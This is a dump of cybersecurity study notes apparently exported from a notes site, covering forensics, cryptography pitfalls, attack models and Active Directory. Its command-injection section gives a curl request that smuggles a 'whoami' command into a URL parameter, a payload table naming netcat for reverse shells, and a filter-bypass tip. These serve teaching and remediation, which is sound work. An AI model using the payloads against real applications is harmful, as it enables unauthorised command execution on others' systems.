Worm Attack - Save the antivirus logs apart from the event logs (pertaining to the antivirus).\n\n## Application Data\n\n> OSs, files and networks are all needed to support applications\" OSs to run the applications, networks to send application data between systems, and files to store application data, configuration settings, and logs. From a forensic perspective, applications bring together files, OSs, and networks. - NIST 800-86\n\n### Application Components\n\n- Config Settings\n  - Configuration File\n  - Runtime Options\n  - Added to Source Code\n- Authentication\n  - External Authentication\n  - Proprietary Authentication\n  - Pass-through Authentication\n  - Host/User Environment\n- Logs\n  - Event\n  - Audit\n  - Error\n  - Installation\n  - Debugging\n- Data\n  - Can live temporarily in memory and/or permanently in files.\n  - File format may be generic or proprietary.\n  - Data may be stored in databases.\n  - Some applications create temp files during session or improper shut down.\n- Supporting Files\n  - Documentation\n  - Links\n  - Graphics\n- App Architecture\n  - Local\n  - Client/Server\n  - Peer-to-Peer\n\n### Types of Applications\n\nCertain types of applications are more likely to be the focus of forensic analysis, including e-mail, web usage, interactive messaging, file sharing, document usage, security applications, and data concealment tools.\n\n- Email: From end-to-end, information regarding a single e-mail message may be recorded in several places - the sender's system, each email server that handles the message, and the recipient's system, as well as the antivirus, spam, and content filtering servers.\" - *NIST 800-45*\n\n- Web usage\n  - Web data from Host: Typically, the richest sources of information regarding Web usage the hosts running the Web Browsers.\n    - Favorite websites\n    - History with time stamps of websites visited\n    - Cached web data files\n    - Cookies\n  - Web data from Server: Another good source of web usage information is web servers, which typically keep logs of the requests they receive.\n    - Timestamps\n    - IP addresses\n    - Web browser version\n    - Type of request\n    - Resource requested\n- Interactive Communications\n  - Group Chat: Typically uses a client/server architecture. The most popular standard group chat protocol for simple text-based communication is Internet Relay Chat (IRC).\n  - Instant Messaging Applications: IM application configuration settings may contain user information, lists of users that the user has communicated with, file transfer information, and archived messages or chat sessions.\n  - Audio & Video:\n    - Technologies such as Voice over IP (VoIP) permit people to conduct telephone conversations over networks such as the Internet.\n- File Sharing\n- Document Usage\n- Security Applications\n- Data Concealment Tools\n\n#### Collecting Application Data\n\n- Filesystem\n- Volatile OS Data\n- Network Traffic\n\n## Network Data\n\n> Analysis can use data from network traffic to reconstruct and analyze network-based attacks and inappropriate network usage, as well as to troubleshoot various types of operational problems... The term network traffic refers to computer network communications that are carried over wired or wireless networks between hosts. - *NIST 800-86*\n\n### TCP/IP\n\nApplication Layer\n: Sends and receives data for particular applications, such as Domain Name System (DNS), Hypertext Transfer Protocol (HTTP), and Simple Mail Transfer Protocol (SMTP).\n\nTransport Layer\n: Provides connection-oriented or connection-less services for transporting application layer services between networks. The transport layer can optionally ensure the reliability of communications. TCP and UDP are commonly used transport layer protocols.\n\nInternet Protocol Layer (also known as Network Layer)\n: Routes packets across network as IP is the fundamental network layer protocol for TCP/IP. Other commonly used protocols at the network layer are Internet Control Message Protocol (ICMP) and Internet Group Management Protocol (IGMP).\n\nHardware Layer (also known as Data Link Layer)\n: Handles communications on the physical network components. The best known data link layer protocol is Ethernet.\n\n#### Sources of Network Data\n\nThese sources collectively capture important data from all four TCP/IP layers.\n\n- Firewalls & Routers\n- Packet Sniffers & Protocol Analyzers\n- Intrusion Detection System\n- Security Event Management Software\n- Network Forensic Analysis Tools\n- Remote Access\n\n### Attacker Identification\n\n- Contact IP Address Owner - Can help identify who is responsible for an IP address. Usually an escalation.\n- Seek ISP Assistance - Requires court order and is only done to assist in the most serious attacks.\n- Send Network Traffic - Not recommended for organizations.\n- History of IP address - Can look for trends of suspicious activity.\n- Application Content - Data packets could contain information about the attacker's identity.\n","n":0.024}}},{"i":62,"$":{"0":{"v":"Dev Sec Ops","n":0.577},"1":{"v":"\n# DevSecOps & Security Automation\n\n- [ ] Understand the concept of DevOps and Automation and its effect on Application Security.\n\n---\n\nDevOps became a development for teams primarily focused on producing new systems, applications. functionality, and making them available to consumers as quickly as possible.\n\n- Both DevOps and security engineers want easily deployable, vulnerability free releases.\n\nDevSecOps is now integrated, automated, continuous security: always.\n\n![dev](https://image.slidesharecdn.com/securityintodevops-differentviewsjul182017-170718191437/95/integrate-security-into-devops-secdevops-19-638.jpg?cb=1500405759)\n\n## Define Operating and Governance Model\n\n- Define strategy up front & apply it throughout.\n- Consider any data sovereignty requirements.\n- Address any audit & compliance requirements.\n- Establish your risk management process.\n- Automated checks for continuous assurance.\n\n## People & Culture\n\nA successful program starts with the people & culture.\n\n- Training & awareness.\n- Explain & embrace new ways of working.\n- Equip teams & individuals with the right level of ownership & tools.\n\n## Learning\n\nContinuous improvement and feedback.\n\n- Lessons learned.\n- Coding & tooling best practices level-set.\n- Ongoing collaboration.\n- Blameless post-mortem.\n\n## Develop Securely: Plan\n\nUse tools and techniques to ensure security is integral to the design, development and operation of all systems.\n\n- **Threat Modeling & Risk Analysis** - Model the threats with experimentation & validation.

Now developed primarily by Google and a consortium known as Open Handset Alliance.\n- First public release in 2008 - Currently on version 10.\n- ~86% of smartphones and ~39% of tablets run some form of Android.\n- MDM capabilities since Android 2.2.\n\n**iOS**\n\n- Developed by Apple exclusively for their products.\n- Launched in 2007 - Currently on version 15.\n- Despite early proliferation and pop culture appeal, Apple smartphones only make up about 13% of devices (based on usage).\n- ~60% of tablets worldwide run iOS/iPadOS.\n- MDM Capabilities available since iOS 6.\n\n### How Mobile Endpoints Differ from Traditional Endpoints\n\n- Users do not interface directly with the OS.\n- A series of applications act as a broker between the user and the OS.\n- OS stability can be easily monitored and any anomalies reported that present risk.\n- Anti-virus software can \"see\" the apps that are installed on a device, and read certain signatures, but can not peek inside at their contents.\n\n### Primary Threats to Mobile Endpoints\n\n#### System-Based\n\n- Jail-breaking and rooting exploit vulnerabilities to provide root access to the system.\n- Systems that were previously read-only can be altered in malicious ways.\n- One primary function is gain access to apps that are not approved or bootleg.\n- Vulnerabilities and exploits in the core code can open devices to remove attacks that provide root access.\n\n#### App-Based Threats\n\n- Primarily comes in the form of Phishing scams - via SMS or Email.\n- Malicious code can infect even public apps. Be wary of granted apps access to sensitive data.\n- Apps may request access to hardware features irrelevant to their functionality.\n- Web content in mobile browsers, especially those that prompt for app installations, can be the root cause of many attacks.\n\n### External\n\n- Network-based attacks may collect sensitive data.\n- Vulnerabilities can be exploited by tethering devices to external media.\n- Social engineering is often used to gain unauthorized access to mobile devices.\n\n### Protecting Mobile Assets\n\n#### MDM\n\nControl the content allowed on devices and restrict access to extraneous, potentially hazardous features. Lock devices down so they are inaccessible if lost or stolen.\n\n- Mobile devices require constant monitoring as they are generally in use all day long.\n\n#### App Security\n\nReport on the health and reliability of applications, often times before they even make it on to devices.\n\n- Any number of systems can be used to monitor as much or as little information as possible.\n\n#### User Training\n\nEducating users on the threats that can impact them is the number one line of defense. This is important for BYOD scenarios where prohibitive management isn't possible.\n\n- Many times there will be gaps that can not be addressed due to system limitations (monitoring iCloud messages, for example).\n\n### Day-to-Day Operations\n\n- Monitor device OS versions\n- Monitor app installs and versions\n- Monitor and enforce encryption\n- Distribute secure payloads\n- Automate compliance actions\n- Ensure proper NAC policies are enforced\n- Educate users regularly\n- Update contingency plans\n\n","n":0.024}}},{"i":64,"$":{"0":{"v":"Cybersecurity","n":1},"1":{"v":"\n# Introduction to Cybersecurity Tools & Cyber Attacks\n\n- [ ] Define cybersecurity and describe key terms and key security roles and functions within an IT organization.\n\n- [ ] Describe the history of cybersecurity and what events brought it into the national spotlight in the United States.\n\n- [ ] Describe why critical thinking is such an important skill for the security analyst to posses in the rapidly evolving cyber-attack landscape.\n\n- [ ] Describe why it is so hard to secure online resources and what organizations and resources are available to help.\n\n---\n\n## Today's Cybersecurity Challenges\n\n- The current threats, alerts, and the needed knowledge is increasing.

Members of the organizations are presumed to have already gone through a process called vetting. Vetting is a screening process where applicant's backgrounds are examined to establish the risk they pose to the organization. Therefore, applicants who are successfully vetted are assumed to be trustworthy.\n\n### Biba Model\n\nThe Biba model is almost the equivalent of the Bell-LaPadula model but for the integrity of the CIA triad.\n\nThis model applies the rule to objects (data) and subjects (users) that can be summarized as \"no write up, no read down\". This rule means that subjects can create or write content to objects at or below their level but can only read the contents of objects above the subject's level.\n\n| Advantages                                                                                                 | Disadvantages                                                                                                                                        |\n| ---------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Model is simple to implement                                                                               | There will be many levels of access and objects. Things can be easily overlooked when applying security controls.                                    |\n| Resolves the limitations of the Bell-LaPadula model by addressing both confidentiality and data integrity. | Often results in delays within a business. For example, a doctor would not be able to read the notes made by a nurse in a hospital with this model. |\n\n![biba](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/895ba351ef24ef6495d290222e49470e.png)\n\nThe Biba model is used in organization or situations where integrity is more important than confidentiality. For example, in software development, developers may only have access to the code that is necessary for their job. They may not need access to critical pieces of information such as databases, etc. ","n":0.035}}},{"i":67,"$":{"0":{"v":"History Impact","n":0.707},"1":{"v":"\n# History of Cybersecurity - From RR/War Games to Modern-day\n\n- [ ] Describe how the movie War Games spurred US President Ronald Reagan to create the first national policy on cybersecurity.\n\n- [ ] Describe how 9/11 and the increasing use of computers and smart phones has impacted the need for robust cybersecurity.\n\n- [ ] Describe how cyber vulnerabilities after 9/11 have been weaponized by governments and exploited by criminals and how rapidly the problem is growing as our reliance on the digital world continues to increase.\n\n---\n\n- Ronald Reagan asked his security personnel to their security advisors if the scene in movie, War Games, was a real threat or possibility.\n  - A plot where a teenager hacks into a computer into the Pentagon and gain control of the nuclear arsenal.\n  - Powers the NSA and other commands in US to deal with Cyber and the National policy\nof telecommunication and automated Information Systems Security NSDD155.\n\n- As soon as 9/11 happened, a lot of people into the US government started asking, how can we avoid the next 9/11?

Terminology\n\nEncryption\n: Process of encoding data in a way that only authorized parties can access it.\n\n- Encryption provides *Confidentiality*, but not *Integrity*.\n- Data can be encrypted\n  - At rest\n  - In use\n  - In transit\n- Sensitive business and personal data should be encrypted **at all times, everywhere.**\n- Importance has risen dramatically in recent years.\n\n### Common Encryption Algorithms\n\n- Symmetric Key (AES, DES, IDEA, ...)\n- Public Key (RSA, Elliptic Curve, DH, ...)\n\n![encryption](https://1.bp.blogspot.com/-gyqO5PbitmM/WEMgAFfdMSI/AAAAAAAABD0/SbYlTPkRDEkiUe_Asvpsyst65RFgH6OHQCLcB/s1600/SymmKeyVsPubKey.jpg)\n\nHash Function\n: Maps data of arbitrary size to data of a fixed size.\n\n- Hashing provides *Integrity*, but not *Confidentiality*.\n- Original data deliberately hard to reconstruct.\n- Used for *integrity checking* and sensitive data storage (e.g. passwords).\n\nData Signature\n: A mathematical scheme for verifying the authenticity of digital messages and documents.\n\n- Uses hashing and public key encryption.\n- Ensure *authentication, non-repudiation, and integrity*.\n\n![signature](https://cdn.educba.com/academy/wp-content/uploads/2019/11/Digital-Signature-Cryptography-2.png)\n\n---\n\n## Cryptography Pitfalls\n\n### Missing Encryption of Data and Communications\n\n- Products handle sensitive business and personal data.\n- Data is often the most valuable asset that the business has.\n- When you store or transmit it in clear text, it can be easily leaked or stolen.\n- Today, there is no excuse for not encrypting data that is stored or transmitted.\n- Cryptographic technology is mature, tested, and is available for all environments.\n\n**RECOMMENDATION** - Encrypt all sensitive data you are handling (and also ensure its integrity).\n\n- Some product owners do not encrypt stored data because \"*users don't have access to the file system*\".\n- There are plenty of vulnerabilities out there that may allow exposure of files stored on the file system.\n- Physical machine running the application may be stolen, hard disk can then be accessed directly.\n\n**RECOMMENDATION** - Have to assume that hte files containing sensitive information may be exposed and analyzed.\n\n### Implementing Own Crypto\n\n- Often, developers use Base64 encoding, simple xor encoding, and similar obfuscation schemes.\n- Also, see products implement their own cryptographic algorithms.\n\n**RECOMMENDATION** - Rely on proven cryptography, that was scrutinized by thousands of mathematicians and cryptographers. Follow recommendations of National Institute of Standards and Technology (NIST).\n\n### Relying on Algorithms Being Secret\n\n- \"Attackers will never know our internal algorithms.\"\n  - They can and will be discovered; only a question of motivation.\n- A whole branch of hacking - **Reverse Engineering** - is devoted to discovering hidden algorithms and data.\n- Application shipped only in compiled form can be \"de-compiled\".\n  - Attackers may analyze trial/free versions of the product, or get copies on the Dark Web.\n\n[The Clearswift-sponsored survey polled more than 500 internet technology decision makers and 4,000 employees in the United States, Europe, and Australia, and discovered that](https://www.clearswift.com/resources/press-releases/new-research-reveals-more-third-employees-willing-sell-private-company-data-and-proprietary):\n\n    25 percent of employees would sell company data, risking both their jobs and criminal convictions, for less than $8000;\n    3 percent of employees would sell private information for as little as $155;\n    18 percent would accept an offer of $1550;\n    35 percent of employees were open to bribes as the offer reached $77,500;\n    65 percent of employees said they wouldn’t sell data for any price.\n\n- \"Security by obscurity\" is not a good defense mechanism.\n  - All algorithms that keep us safe today are open source and very well-studied: AES, RSA, SHA*, ...\n\n**RECOMMENDATION** - Always assume that algorithms will be known the the adversary.\n\n- Kerckhoff's Principle - *\"A crypto-system should be secure even if everything about the system, except the key, is public knowledge.\"*\n\n### Using Hardcoded/Predictable/Weak Keys\n\n- Not safeguarding keys renders crypto mechanisms useless.\n- When the passwords and keys hardcoded in the product or stored plaintext in the config file, they can be easily discovered by an attacker.\n- An easily guessed key can be found by trying commonly used passwords.\n- When keys are generated randomly, they have to be generated from cryptographically-secure source of randomness, not the regular RNG.\n\n**RECOMMENDATION** - Rely on hard to guess, randomly generated keys and passwords that are stored securely.\n\n### Ignoring Encryption Export Regulation Rules\n\n- Encryption is export controlled.\n- All code that...\n  - **contains** encryption (closed or open-source).\n  - **calls** encryption algorithms in another library or component.\n  - **directs** encryption functionality in another product... must be classified for export __*before*__ being released.\n\n---\n\n## Encrypting Data at Rest\n\n- The rule of thumb is to encrypt all sensitive data at rest: in files, config files, databases, backups.\n- Symmetric key encryption is most commonly used.\n- Follow NIST guidelines for selecting appropriate algorithm - Currently it is AES (with CBC mode) and Triple DES.\n\n## Pitfalls and Recommendations\n\n- Some algorithms are outdated and no longer considered secure.\n  - Examples include DES, RC4, and others.\n- Use hardcoded/easily guessed/insufficiently random keys.\n  - Select cryptographically-random keys, do not reuse keys for different installs.\n- Storing keys in a clear text in proximity to data they protect (\"key under the doormat\").\n  - Store keys in secure keystores.\n- Using initialization vectors (IVs) incorrectly.\n  - Use a new *random* IV every time.\n- Preferable to select the biggest key size you can handle (but watch out for export restrictions).\n\n## Encrypting Data in Use\n\n- Unfortunately a rarely-followed practice.\n- Memory could be leaked by attacker.\n  - Famous 2014 Heartbleed defect leaked memory of processes that used OpenSSL.\n- The idea is to keep data encrypted up until it must be used.\n- Decrypt data as needed, and then promptly erase it in memory after use.\n- Keep all sensitive data (data, keys, passwords) encrypted except a brief moment of use.\n- Consider __**Homomorphic encryption**__ if it can be applied to your application.\n\n## Encrypting Data in Transit\n\n- Today, there is no excuse for communicating in clear text.\n- There is an industry consensus about; Firefox and Chrome now mark HTTP sites as insecure.\n- Attackers can easily snoop on unprotected communications.\n- All communications (not just HTTP) should be encrypted, including: RPC, database connections, and others.\n- TLS/SSL is most commonly used protocol.\n  - Public key crypto (RSA, DH) for authentication and key exchange; Symmetric key crypto to encrypt the data.\n  - Server Digital Certificate references certificate authority (CA) and the public key.\n- Sometimes just symmetric key encryption is employed (but requires pre-sharing of keys).\n\n## Additional Pitfalls\n\n### Using self-signed certificates\n\n- Less problematic for internal communications but still dangerous.\n- Use properly generated certificates verified by established CA.\n\n### Accepting arbitrary certificates\n\n- Attacker can issue their own certificate and snoop on communications (MitM attacks).\n- Do not accept arbitrary certificates without verification.\n\n### Not using certificate pinning\n\n- Attacker may present a properly generated certificate and still snoop on communications.\n- *Certificate pinning* can help - presented certificate is checked against a set of expected certificates.\n\n### Using outdated versions of the protocol or insecure cipher suites\n\n- Old versions of SSL/TLS are vulnerable (DROWN, POODLE, BEAST, CRIME, BREACH, and other attacks).\n- **TLS v1.1-1.3 are safe to use (1.2 is recommended, with 1.3 coming).\n- Review TLS support; there are tools to help you:\n  - Nessus, Qualys SSL Server Test (external only), sslscan, sslyze.\n\n### Allow TLS downgrade to insecure versions, or even to HTTP\n\n- Lock down versions of TLS that you support and do not allow downgrade; disable HTTP support altogether.\n\n### Not Safeguarding Private Keys\n\n- Do not share private keys between different customers, store them in secure keystores.\n\n#### Additional Recommendations\n\n##### Consider Implementing Forward Secrecy\n\n- Some cipher suites protect past sessions against future compromises of secret keys or passwords.\n\n##### Do not use compression under TLS\n\n- CRIME/BREACH attacks showed that using compression with TLS for changing resources may lead to sensitive data exposure.\n\n##### Implement HTTP Strict Transport Security (HSTS)\n\n- Implement Strict-Transport-Security header on all communications.\n\n##### Stay Informed of Latest Security News\n\n- A protocol or cipher suite that is secure today may be broken in the future.\n\n","n":0.027}}},{"i":72,"$":{"0":{"v":"Quantum Computers","n":0.707},"1":{"v":"\n# Impact of Quantum Computing\n\n- [ ] Describe the impacts of quantum computing on cryptography.\n\n---\n\nQuantum computing\n: Computing using quantum-mechanical phenomena.\n\n- Still 10-15 years away from quantum computing having an effect on crypto.\n\n## Risks\n\nExisting crypto symmetric encryption (e.g. AES) will be weakened.\n  \n- To maintain current levels of security, double the encryption key size (go from 128-bit to 256-bit keys).\n\nPublic key encryption that relies on prime number factorization (RSA used in SSL/TLS, blockchain, digital signatures) will be broken.\n\n- Plan on switching to quantum-resistant algorithms (Lattice-based Cryptography, Homomorphic Encryption).\n\nAttacker can capture conversations now and decrypt them when quantum computing becomes available.\n\n- Make encryption, hash, signing algorithms \"replaceable\", to exchange them for something more robust if a weakness is discovered.\n","n":0.092}}},{"i":73,"$":{"0":{"v":"Hashing","n":1},"1":{"v":"\n# Hashing\n\n- [ ] Describe hashing and its purpose in encryption.\n- [ ] Describe common pitfalls of using hashing.\n- [ ] Describe additional considerations when using hashing.\n- [ ] Define Message Authentication Codes (MACs).\n\n---\n\nHashing is used for a variety of purposes:\n\n- Validating passwords (salted hashes).\n- Verifying data/code *integrity* (message authentication codes and keyed hashes).\n- Verifying data/code *integrity* and *authenticity* (digital signatures).\n- Use secure hash functions (follow NIST recommendations):\n  -

If the key is not known, attacker cannot alter the message and be able to generate another valid HMAC.\n- HMACs help when data may be maliciously altered while under temporary attacker's control (e.g. cookies, or transmitted messages).\n- Even encrypted data should be protected by HMACs to avoid *bit-flipping attacks*.\n\n","n":0.053}}},{"i":74,"$":{"0":{"v":"Digital Signatures","n":0.707},"1":{"v":"\n# Digital Signatures\n\n- [ ] Describe recommended uses of digital signatures.\n\n- [ ] Describe how to safeguard encryption keys.\n- [ ] Describe how to secure the Key Encryption Key (KEK).\n\n---\n\nDigital Signatures\n: Ensure that messages and documents come from an *authentic source* and were *not maliciously modified* in transit.\n\n- Some recommended uses of digital signatures include verifying integrity if:\n  -

For example, the shell operators `;`, `&`, and `&&` will combine two (or more) system commands and execute them both.\n\nCommand injection can be detected in two ways:\n\n1. **Blind command injection**: There is no direct output from the application when testing payloads. You will have to investigate the behaviors of the application to determine whether or not the payload was successful.\n2. **Verbose command injection**: There is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly.\n\n### Detecting Blind Command Injection\n\nThere is no output visible, so it is not immediately noticeable when command command injection occurs. A command is executed, but the web application outputs no message.\n\nMust use payloads that will cause some time delay. For example, the `ping` and `sleep` commands are significant payloads to test with.\n\n- Using `ping`, the application will hang for x amount of seconds in relation to how many pings specified.\n- Another method to detect blind command injection is by forcing output using redirection operators such as `>`.\n  - The web application will execute commands such as `whoami` and redirect to a file and use `cat` to read newly created file content.\n- The `curl` command is great to test for command injection. `curl` is used to deliver data to and from an application in your payload.\n  - `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`\n\n### Detecting Verbose Command Injection\n\nDetecting command injection is the easiest method because the application gives you feedback or output to what is happening or being executed.\n\n- The output of commands such as `ping` or `whoami` is directly displayed on the web application.\n\n### Useful Payloads - Linux & Windows\n\n#### Linux Payloads\n\n\n| Payload | Description                                                                              |\n| ------- | ---------------------------------------------------------------------------------------- |\n| whoami  | See what user the application is running under.                                          |\n| ls      | List the contents of the current directory.                                              |\n| ping    | Invoke the application to hang. Useful for testing blind command injection.              |\n| sleep   | Useful for blind command injection where the machine does not have `ping` installed.     |\n| nc      | Netcat can be used to spawn a reverse shell onto the vulnerable application and escalate |\n\n#### Windows Payloads\n\n| Payload | Description                                                                                          |\n| ------- | ---------------------------------------------------------------------------------------------------- |\n| whoami  | See what user the application is running under.                                                      |\n| dir     | List the contents of the current directory.                                                          |\n| ping    | Invoke the application to hang. Useful for testing blind command injection.                          |\n| timeout | Invoke the application to hang for blind testing blind command injection if `ping` is not installed. |\n\n## Remediating Command Injection\n\nCommand injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on user's input.\n\n### Vulnerable Functions\n\nBelow are examples of PHP language, however, the same principles can be extended to many other languages. In PHP, many functions interact with the operating system to execute commands via shell:\n\n- Exec\n- Passthru\n- System\n\n![PHP-function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/14acf436361fcfb7efced4b2f416b3d5.png)\n\n1. The application will only accept a specific pattern of characters (the digits 0-9).\n2. The application will then only proceed to execute this data which is all numerical.\n\nThese functions take input such as string or user data and will execute whatever is provided on the system. Any application that uses these functions without proper checks will be vulnerable to command injection.\n\n### Input Sanitization\n\nSanitizing any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit from numerical data or removing any special characters.\n\n![PHP-sanitization](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/06e83dfe3791664ed0bb9bc9ffd3e581.png)\n\nThe `filter_input` PHP function is used to check whether or no any data submitted via an input form is a number. If it is not a number, it must be a invalid input.\n\n### Bypassing Filters\n\nApplications will employ numerous techniques in filtering and sanitizing data from a user's input. We can abuse the logic behind an application to bypass these filters.\n\n- An application may strip out quotation marks - Instead, use the hexadecimal value of this to achieve the same result.","n":0.031}}},{"i":76,"$":{"0":{"v":"Actor Motives","n":0.707},"1":{"v":"\n# Overview of Types of Actors and Motives\n\nA brief overview of types of actors and their motives.\n\n- [ ] Understand different types of attacks and their impact on an organization and individuals.\n- [ ] Learn about tools that are available to assist in any cybersecurity investigation.\n- [ ] Describe the different types of cyber-attacks, security attack models, the organizations and actors involved, and their motives.\n- [ ] Give examples of different types of cyber-attacks and examples of cyberwar attacks.\n- [ ] Describe social engineering and how it is used in phishing and vishing attacks.\n- [ ] Describe the various cybersecurity tools and resources available to the cybersecurity analyst such as X-Force Research and the IBM X-Force Command Center.\n\n- [ ] Describe who the primary actors are in cyber crime and their motives?\n\n- [ ] Describe and name the major cyber crime and hacker organizations that are now operating worldwide.\n\n- [ ] Describe the major different types of cyber attacks and the impacts they have had.\n\n---\n\n## Types of Actors and their Motives\n\n- **Hackers (Pay or not)** = They can be attacks that are paid by private or public organizations.

It does not matter if the attack succeeds. It is still considered an attack even if it fails.\n\n### 2 Forms of Passive Attacks\n\n- **Disclosure** (release of message contents)\n: The content of a message is revealed to the unauthorized parties. An attack on the *confidentiality* of a message.\n\n- **Traffic analysis** (or traffic flow analysis). Even if an opponent cannot read the message content, information about the message may be useful information to the opponent. Also an attack on the *confidentiality* of the message.\n\n### 4 Forms of Passive Attacks\n\n- **Masquerade**\n: An opponent impersonates a known or authorized person or system. This is an attack on the *authentication* of the authorized entity's *identity*. An attack on the *authentication* of the *origin* of the message.\n\n## Security Architecture Attacks\n\n**Replay**\n: A copy of legitimate message is captured by an opponent and re-transmitted. This is an attack on the *integrity* of the system's data.\n\n**Modification**\n: The content of a legitimate message is altered. This is an attack on the *integrity* of the message.\n\n**Denial of Service (DoS)**\n: An opponent prevents authorized users from accessing a system. This is an attack on the *availability* of the system.\n\n---\n\n### Security Architecture-Attack Models\n\nNormally, information flows directly from the source to the destination.\n\n- The information never arrives at the destination = *Active Attack (denial of service)*.\n- The information arrives but an opponent obtains a copy = *Passive attack (disclosure).*\n- An opponent intercepts the original message and forwards a modified version that appears to come from the original source = *Active attack (masquerade).*\n- An opponent creates a message which appears to have come from the legitimate source = *Active attack (masquerade, denial of service).*\n- The message never arrives at the destination but an opponent obtains a copy = *Active attack (denial of service).*\n\n","n":0.031}}},{"i":80,"$":{"0":{"v":"Attack Examples","n":0.707},"1":{"v":"\n# Additional Attack Examples Today\n\n- [ ] Describe how network mapping, or \"casing the joint\" is used by bad actors, what commands are used and what information is commonly gathered.\n- [ ] Describe the countermeasures that can be used against mapping threats.\n- [ ] Describe packet sniffing and how it can be used to gather information about your network.\n- [ ] Describe the countermeasures you can deploy to safeguard against packet sniffers.\n\n- [ ] Describe how IP Spoofing can be used by attackers.\n- [ ] Describe how ingress filtering can be used as a countermeasure to safeguard against IP Spoofing and its level of effectiveness.\n\n- [ ] Describe how Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks are carried out.\n- [ ] Describe how packet filtering and traceback can be used to help counter DoS attacks and the shortcoming of these measures.\n\n- [ ] Describe how host insertions are used to compromise a network.\n- [ ] Describe what measures can be taken to protect against unauthorized insertion of a new host on your network.\n\n## Internet Security Threats\n\n### Mapping\n\n- Before attacking - \"case the joint\" to find out what services are implemented on the network.\n- Use `ping` to determine what hosts have addresses on the network.\n- Port-scanning to attempt to establish TCP connection to each port in sequence (see what happens).\n- *nmap* mapper (network exploration and security auditing).\n  \n#### Mapping Countermeasures\n\n- Record traffic entering network.\n- Look for suspicious activity (IP addresses, ports being scanned sequentially).\n- Use a host scanner and keep a good inventory of hosts on the network.\n  - Be wary of an unexpected \"computer\" appears on the network.\n\n---\n\n### Packet Sniffing\n\n- Broadcast media\n- Promiscuous NIC reads all packets passing by.\n- Can read all unencrypted data (e.g passwords).\n- Computer C sniffs Computer B packets.\n\n#### Countermeasures - Packet Sniffing\n\n- All hosts in organization run software that checks periodically if host interface in promiscuous mode.\n- One host per segment of broadcast media (switched Ethernet at hub).\n\n---\n\n### IP Spoofing\n\n- Can generate \"raw\" IP packets directly from application, putting any value into IP source address field.\n- Receiver can't tell if source is spoofed.\n- e.g: C pretends to be B.\n\n#### Countermeasures - IP Spoofing\n\n**Ingress filtering**:\n\n- Routers should not forward outgoing packets with invalid source addresses (datagram source address not in router's network).\n- Downside is can not be mandated for all networks.\n\n---\n\n### Denial of Service\n\n- Flood of maliciously generated packets \"swamp\" receiver.\n- Distributed DOS (DDoS): Multiple coordinated sources of packets to target the user.\n\n#### Countermeasures -

Allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine.\n\n#### Physical Active Directory\n\n- Servers and machines on-premises or anything from domain controllers and storage to user machines.\n\nDomain Controllers\n: A Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest.\n\n- Holds the AD DS data store\n- Handles the authentication and authorization services\n- Replicate updates from other domain controllers in the forest\n- Allows admin access to manage domain resources\n\n#### AD DS Data Store\n\nActive Directory Data Store\n: Holds the databases and processes needed to store and manage directory information such as users, groups, and services.\n\n- Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.\n- Stored by default in %SystemRoot%\\NTDS\n- Accessible only by the domain controller\n\n## The Forest\n\nDefines everything; it is the container that holds all of the other bits and pieces of the network together - without the forest, all the other trees and domains would not be able to interact.\n\n- The \"forest\" is to describe the connection created between these trees and domains by the network.\n  - A collection of one or more domain trees inside of an Active Directory network:\n    - **Trees** - Hierarchy of domains in Active Directory Domain Services\n    - **Domains** - Used to group and manage objects\n    - **Organizational Units (OUs)** - Containers for groups, computers, users, printers and other OUs\n    - **Trusts** - Allows user to access resources in other domains\n    - **Objects** - Users, groups, printers, computers, shares\n    - **Domain Services** - DNS server, LLMNR, IPv6\n    - **Domain Schema** - Rules for object creation\n\n## Users + Groups\n\nUsers and groups are inside of an Active Directory. When a domain controller is created, has default groups and two default users: Administrator and guest.\n\n### Users\n\nUsers are the main component to Active Directory. There are four main types of users and there could be more depending on the permissions of its users:\n\n- **Domain Admins** - Control the domains and only access to the domain controller\n- **Service Accounts** (can be Domain Admins) - Required by Windows for services such as SQL to pair a service with a service account\n- **Local Administrators** - These users can make changes to local machines as an administrator but cannot access the domain controller\n- **Domain Users** - Everyday users in the organization\n\n### Groups\n\nGroups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. \n\n- **Security Groups** - Used to specify permissions for a large number of users.\n- **Distribution Groups** - Used to specify email distribution lists.\n\n#### Default Security Groups\n\n**Domain Controllers**\n: All domain controllers in the domain\n\n**Domain Guests**\n: All domain guests\n\n**Domain Users**\n: All domain users\n\n**Domain Computers**\n: All workstations and servers joined to the domain\n\n**Domain Admins**\n: Designated administrators of the domain\n\n**Enterprise Admins**\n: Designated administrators of the enterprise\n\n**Schema Admins**\n: Designated administrators of the schema\n\n**DNS Admins**\n: DNS administrators of the group\n\n**DNS Update Proxy**\n: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers)\n\n**Allowed RODC Password Replication Group**\n: Members in this group can have their passwords replicated to all read-only domain controllers in the domain\n\n**Group Policy Creator Owners**\n: Members can modify group policy for the domain\n\n**Denied RODC Password Replication Group**\n: Members cannot have their passwords replicated to any read-only domain controllers\n\n**Protected Users**\n: Members are afforded additional protections against authentication security threats\n\n**Cert Publishers**\n: Members are permitted to publish certificates to the directory\n\n**Read-Only Domain Controllers**\n: Members are Read-Only Domain Controllers in the domain\n\n**Enterprise Read-Only Domain Controllers**\n: Members are Read-Only Domain Controllers in the enterprise\n\n**Key Admins**\n: Members can perform administrative actions on key objects within the domain\n\n**Enterprise Key Admins**\n: Members can perform administrative actions on key objects within the forest\n\n**Cloneable Domain Controllers**\n: Members that are domain controllers may be cloned\n\n**RAS and IAS Servers**\n: Servers can access remote access properties of users\n\n## Trusts + Policies\n\nHelp the domain and trees communicate with each other and maintain 'security' inside of the network.\n\n### Domain 